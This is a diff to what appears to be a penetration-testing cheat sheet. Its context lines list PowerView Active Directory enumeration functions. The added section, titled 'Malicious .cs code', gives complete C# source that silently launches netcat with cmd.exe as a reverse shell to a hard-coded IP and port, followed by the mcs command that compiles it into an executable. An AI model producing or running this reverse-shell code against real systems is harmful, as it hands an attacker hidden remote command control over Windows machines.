@@ -207,3 +207,26 @@ Get-DomainForeignUser               -   enumerates users who are in groups outsi
 Get-DomainForeignGroupMember        -   enumerates groups with users outside of the group's domain and returns each foreign member
 Get-DomainTrustMapping              -   this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds
 ```
+# Malicious .cs code and make it executable using `MCS`
+```cs
+# Make a file named exploit.cs
+
+using System;
+using System.Diagnostics;
+namespace exploit{
+    class Program{
+        static void Main(){
+        	Process proc = new Process();
+		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "10.50.76.115 9999 -e cmd.exe");
+		procInfo.CreateNoWindow = true;
+		proc.StartInfo = procInfo;
+		proc.Start();
+	}
+    }
+}
+
+
+# Compile code using mcs cmd to make an executable binary.
+
+└─$ mcs exploit.cs 
+```
